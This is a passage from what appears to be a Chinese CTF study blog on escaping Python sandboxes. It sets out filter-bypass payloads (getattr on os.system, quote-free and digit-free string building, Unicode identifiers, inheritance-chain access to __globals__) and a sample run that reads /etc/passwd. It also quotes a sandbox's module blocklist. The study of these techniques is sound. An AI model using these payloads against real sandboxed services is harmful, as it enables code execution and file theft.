<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getattr(object, name[, default])</span><br></pre></td></tr></table></figure>

<p>其中的object是对象，name是字符串，代表要获取的属性的名称。如果提供了 default 参数，当属性不存在时会返回这个值，否则会抛出 AttributeError。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(&#123;&#125;,<span class="string">&#x27;__class__&#x27;</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(os,<span class="string">&#x27;system111&#x27;</span>,os.system)(<span class="string">&#x27;cat /etc/passwd&#x27;</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/usr/<span class="built_in">bin</span>/zsh</span><br><span class="line"></span><br><span class="line">同样可用于继承链：</span><br><span class="line"><span class="built_in">getattr</span>(().__class__.__mro__[<span class="number">1</span>],<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">117</span>)+<span class="built_in">chr</span>(<span class="number">98</span>)+<span class="built_in">chr</span>(<span class="number">99</span>)+<span class="built_in">chr</span>(<span class="number">108</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">115</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">95</span>))()</span><br></pre></td></tr></table></figure>

<h6 id="getattribute-函数"><a href="#getattribute-函数" class="headerlink" title="__getattribute__ 函数"></a><code>__getattribute__</code> 函数</h6><p>这个函数定义了当我们尝试获取一个对象的属性时应该进行的操作。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__</span><br><span class="line">&lt;method-wrapper <span class="string">&#x27;__getattribute__&#x27;</span> of module <span class="built_in">object</span> at <span class="number">0x7f06a9bf44f0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__getattribute__(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function system&gt;</span><br><span class="line"></span><br><span class="line">个人感觉这个在沙箱逃逸这里的局限性挺大的，也就只有过滤函数和一些属性值（ssti方面）的时候能用</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;os.__getattribute__(&#x27;system&#x27;)(&#x27;dir&#x27;)&quot;</span>)  这里再联想到字符串拼接来可以绕过system被过滤</span><br></pre></td></tr></table></figure>

<h6 id="getattr-函数"><a href="#getattr-函数" class="headerlink" title="__getattr__函数"></a><code>__getattr__</code>函数</h6><p><code>__getattr__</code>是Python的一个特殊方法，当尝试访问一个对象的不存在的属性时，它就会被调用。它允许一个对象动态地返回一个属性值，或者抛出一个<code>AttributeError</code>异常</p>
<p>如下是 <code>__getattr__</code> 方法的基本形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getattr__</span>(<span class="params">self, name</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;You tried to get &#x27;</span> + name</span><br></pre></td></tr></table></figure>

<p>在这个例子中，任何你尝试访问的不存在的属性都会返回一个字符串，形如 “You tried to get X”，其中 X 是你尝试访问的属性名。</p>
<p>与<code>__getattribute__</code>不同，<code>__getattr__</code>只有在属性查找失败时才会被调用，这使得<code>__getattribute__</code>可以用来更为全面地控制属性访问</p>
<p>如果在一个类中同时定义了 <code>__getattr__</code> 和 <code>__getattribute__</code>，那么无论属性是否存在，<code>__getattribute__</code> 都会被首先调用。只有当 <code>__getattribute__</code> 抛出 <code>AttributeError</code> 异常时，<code>__getattr__</code> 才会被调用。</p>
<p>另外，所有的类都会有<code>__getattribute__</code>属性，而不一定有<code>__getattr__</code>属性。</p>
<h6 id="属性值替换"><a href="#属性值替换" class="headerlink" title="属性值替换"></a>属性值替换</h6><p>正如ssti那里说过的，</p>
<p><code>__globals__</code> 可以用 func_globals 直接替换；</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">&quot;__glo&quot;</span>+<span class="string">&quot;bals__&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>同样<code>__mro__</code>、<code>__bases__</code>、<code>__base__</code>互换</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">[].__class__.__mro__[-<span class="number">1</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__base__</span><br></pre></td></tr></table></figure>



<h6 id="过滤import"><a href="#过滤import" class="headerlink" title="过滤import"></a>过滤import</h6><p><code>__loader__.load_module</code></p>
<p> <code>__loader__.load_module</code> 底层实现与 import 不同, <strong>因此某些情况</strong>下可以绕过。并且有一个缺点就是无法导入非内建模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __loader__.load_module(&#x27;os&#x27;)</span><br><span class="line">&lt;module &#x27;os&#x27; (built-in)&gt;</span><br></pre></td></tr></table></figure>



<h6 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h6><p>应该也可以用于过滤关键字这里的几个函数有些也能用于关键词过滤，注意知识点串联。</p>
<p><strong>str函数</strong></p>
<p>如果过滤了引号，我们 payload 中构造的字符串会受到影响。其中一种方法是使用 str() 函数获取字符串，然后索引到预期的字符。将所有的字符连接起来就可以得到最终的字符串。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__new__</span><br><span class="line">&lt;built-<span class="keyword">in</span> method __new__ of <span class="built_in">type</span> <span class="built_in">object</span> at <span class="number">0x9597e0</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)</span><br><span class="line"><span class="string">&#x27;&lt;built-in method __new__ of type object at 0x9597e0&gt;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]</span><br><span class="line"><span class="string">&#x27;w&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure>

<p><strong>chr函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chr(47)+chr(101)+chr(116)+chr(99) ==》/etc</span><br></pre></td></tr></table></figure>

<p><u>对应ascii表</u></p>
<p><strong>list+dict 构造任意字符串</strong></p>
<p>使用dict和list进行配合可以将变量名转化为字符串，但这种方式的<u>弊端</u>在于字符串中不能有空格等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(dict(whoami=1))[0] ==》 whoami</span><br></pre></td></tr></table></figure>

<p><strong><code>__doc__</code></strong></p>
<p><code>__doc__</code>变量可以获取到类的说明信息，从其中索引处想要的字符串然后进行拼接就可以得到字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(eval(&quot;().__doc__.find(&#x27;l&#x27;)&quot;)) ==》3</span><br><span class="line">print(eval(&quot;().__doc__.find(&#x27;s&#x27;)&quot;)) ==》19</span><br><span class="line"></span><br><span class="line">().__doc__[3]+().__doc__[19] ==》ls</span><br></pre></td></tr></table></figure>

<p><strong>bytes函数</strong></p>
<p>bytes函数可以接收一个ascii列表，然后转换为二进制字符串，再调用decode则可以得到字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>([<span class="number">108</span>,<span class="number">115</span>]).decode()) ==&gt;ls</span><br></pre></td></tr></table></figure>

<h6 id="过滤"><a href="#过滤" class="headerlink" title="过滤 +"></a>过滤 +</h6><p>过滤了 + 号主要影响到了构造字符串，构造字符串还可以使用 join 函数</p>
<p>例如想要得到字符串 system ，可以用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>])</span><br><span class="line"></span><br><span class="line">join函数语法：<span class="string">&#x27;sep&#x27;</span>.join(seq) ，这里的sep代表分隔符，再这个例子中的<span class="string">&#x27;&#x27;</span>应该是代表没有分隔符，如果是<span class="string">&#x27;-&#x27;</span>，那么结果为s-y-s-t-e-m</span><br></pre></td></tr></table></figure>

<p>假如题目过滤了引号和加号,这里可以使用到 str() 这个函数来进行同样的操作（应该就是代表是字符串），初始的字符串可以通过 str() 进行获取.具体的字符串内容可以从 <code>__doc__</code> 中取，上面这个又可以写成下面这种形式：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>().join([().__doc__[<span class="number">19</span>],().__doc__[<span class="number">23</span>]])</span><br></pre></td></tr></table></figure>



<h6 id="过滤了数字"><a href="#过滤了数字" class="headerlink" title="过滤了数字"></a>过滤了数字</h6><p>如果过滤了数字的话，可以使用一些函数的返回值获取。例如： <u>0</u>：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code>、<code>any(())</code> <u>1</u>：<code>int(bool([&quot;&quot;]))</code>、<code>True</code>、<code>all(())</code>、<code>int(list(list(dict(a၁=())).pop()).pop())</code></p>
<p>有了 0 之后，其他的数字可以通过运算进行获取：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> ** <span class="number">0</span> == <span class="number">1</span></span><br><span class="line"><span class="number">1</span> + <span class="number">1</span> == <span class="number">2</span></span><br><span class="line"><span class="number">2</span> + <span class="number">1</span> == <span class="number">3</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">2</span> == <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>当然也可以直接通过 repr 获取一些比较长字符串，然后使用 len 获取大整数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="literal">True</span>))</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="built_in">repr</span>(<span class="built_in">bytearray</span>))</span><br><span class="line"><span class="number">19</span></span><br><span class="line"></span><br><span class="line">对于这个字符串还是有点讲究的，最好不用这个</span><br></pre></td></tr></table></figure>

<p>第三种方法，可以使用 len + dict + list 来构造,这种方式可以避免运算符的的出现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> -&gt; <span class="built_in">len</span>([])</span><br><span class="line"><span class="number">2</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aa=()))[<span class="built_in">len</span>([])])</span><br><span class="line"><span class="number">3</span> -&gt; <span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aaa=()))[<span class="built_in">len</span>([])])</span><br></pre></td></tr></table></figure>

<p>第四种方法: unicode,可以使用ord来获取字符的ascii，再进行加减，如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># f = 102 = 333-231 = ord(&#x27;ō&#x27;)-ord(&#x27;ç&#x27;)</span></span><br><span class="line"><span class="comment"># l = 108 = 333-225 = ord(&#x27;ō&#x27;)-ord(&#x27;á&#x27;)</span></span><br><span class="line"><span class="comment"># a = 97 = 333-236 = ord(&#x27;ō&#x27;)-ord(&#x27;ì&#x27;)</span></span><br><span class="line"><span class="comment"># g = 103 = 333-230 = ord(&#x27;ō&#x27;)-ord(&#x27;æ&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ç&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;á&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;ì&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;ō&#x27;</span>)-<span class="built_in">ord</span>(<span class="string">&#x27;æ&#x27;</span>)])).read())</span><br></pre></td></tr></table></figure>



<h6 id="unicode绕过"><a href="#unicode绕过" class="headerlink" title="unicode绕过"></a>unicode绕过</h6><p><strong>Python3开始</strong>支持非ascii字符的标识符，也就是说，<strong>可以使用unicode字符作为Python的变量名、函数名</strong>等。Python 在解析代码时，使用的 Unicode Normalization Form KC (NFKC) 规范化算法，这种算法可以将一些视觉上相似的 Unicode 字符统一为一个标准形式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval == 𝘦val</span><br></pre></td></tr></table></figure>

<p>下面是 0-9,a-z 的 unicode 字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗</span><br><span class="line">𝘢𝘣𝘤𝘥𝘦𝘧𝘨𝘩𝘪𝘫𝘬𝘭𝘮𝘯𝘰𝘱𝘲𝘳𝘴𝘵𝘶𝘷𝘸𝘹𝘺𝘻 </span><br><span class="line">𝘈𝘉𝘊𝘋𝘌𝘍𝘎𝘏𝘐𝘑𝘒𝘔𝘕𝘖𝘗𝘘𝘙𝘚𝘛𝘜𝘝𝘞𝘟𝘠𝘡 </span><br></pre></td></tr></table></figure>

<p>下划线可以使用对应的全角字符进行替换：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">＿</span><br></pre></td></tr></table></figure>

<p>使用时注意第一个字符不能为全角，否则会报错：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(_＿name_＿)</span><br><span class="line">__main__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(＿＿name_＿)</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(＿＿name_＿)</span><br><span class="line">          ^</span><br><span class="line">SyntaxError: invalid character <span class="string">&#x27;＿&#x27;</span> (U+FF3F)</span><br></pre></td></tr></table></figure>

<p><strong>需要注意的是，某些 unicode 在遇到 lower() 函数时也会发生变换，因此碰到 lower()、upper() 这样的函数时要格外注意。</strong></p>
<h6 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤[]"></a>过滤[]</h6><p>同ssti，可用</p>
<p>1.<code>__getitem__()</code>函数替换</p>
<p>2.使用<code>pop()</code>函数</p>
<h4 id="绕过命名空间限制"><a href="#绕过命名空间限制" class="headerlink" title="绕过命名空间限制"></a>绕过命名空间限制</h4><h5 id="部分限制"><a href="#部分限制" class="headerlink" title="部分限制"></a>部分限制</h5><p>有些沙箱在构建时使用exec来执行目录，exec函数的第二个参数可以指定命名空间，通过修改。删除命名空间中的函数则可以构建一个沙箱。例子来源于 iscc_2016_pycalc。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span class="built_in">format</span>(forbid))</span><br><span class="line">    <span class="comment"># normal modules can be imported</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">__import__</span>(name, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_exec</span>(<span class="params">command</span>):      <span class="comment"># sandbox user input</span></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    __sandboxed_builtins__ = <span class="built_in">dict</span>(__builtins__.__dict__)</span><br><span class="line">    __sandboxed_builtins__[<span class="string">&#x27;__import__&#x27;</span>] = _hook_import_    <span class="comment"># hook import</span></span><br><span class="line">    <span class="keyword">del</span> __sandboxed_builtins__[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    _<span class="keyword">global</span> = &#123;</span><br><span class="line">        <span class="string">&#x27;__builtins__&#x27;</span>: __sandboxed_builtins__</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">        <span class="built_in">exec</span> command <span class="keyword">in</span> _<span class="keyword">global</span>     <span class="comment"># do calculate in a sandboxed  </span></span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p><code>__builtins__</code> 是一个特殊的内建模块，不仅可以提供基础的异常和函数，例如 <code>ValueError</code>、<code>len()</code>、<code>print()</code> 等，还提供了一些内建类型，例如 <code>list</code>、<code>dict</code> 和 <code>str</code> 等。</p>
<ol>
<li>沙箱先获取<code>__builtins__</code>，然后根据现有的<code>__builtins__</code>来构建命名空间。</li>
<li>修改<code>__import__</code>函数为自定义的<code>_hook_import_</code></li>
<li>删除 open函数防止文件操作</li>
<li>exec那里，其中<code>_global</code>为一个字典，表示command将在<code>_global</code>指定的命名空间中运行</li>
</ol>
<p>这里只是部分限制了open函数，并且要求不能有黑名单里面的模块</p>
<p>此时要么可以找到不在黑名单里面的模块进行rce或者文件读取，要么可以通过获取其他命名空间里的<code>__builtins__</code>（这个<code>__builtins__</code>保存的就是原始<code>__builtins__</code>的引用），比如types库，来执行任意命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;types&#x27;).__builtins__</span><br><span class="line">__import__(&#x27;string&#x27;).__builtins__</span><br></pre></td></tr></table></figure>

<h5 id="完全限制（no-builtins）"><a href="#完全限制（no-builtins）" class="headerlink" title="完全限制（no builtins）"></a>完全限制（no builtins）</h5><p>如果沙箱完全清空了<code>__builtins__</code>，则无法使用import，如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>, &#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;__import__&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__&quot;</span>)</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&quot;import os&quot;</span>,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;,&#123;<span class="string">&quot;__builtins__&quot;</span>: &#123;&#125;&#125;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">ImportError: <span class="built_in">__import__</span> <span class="keyword">not</span> found</span><br></pre></td></tr></table></figure>

<p><strong>这种情况下就需要利用python继承链来绕过</strong>，就是Python继承链获取内置类，然后通过这些内置类获取到敏感方法再进行利用。</p>
<p>一些常见的payload:</p>
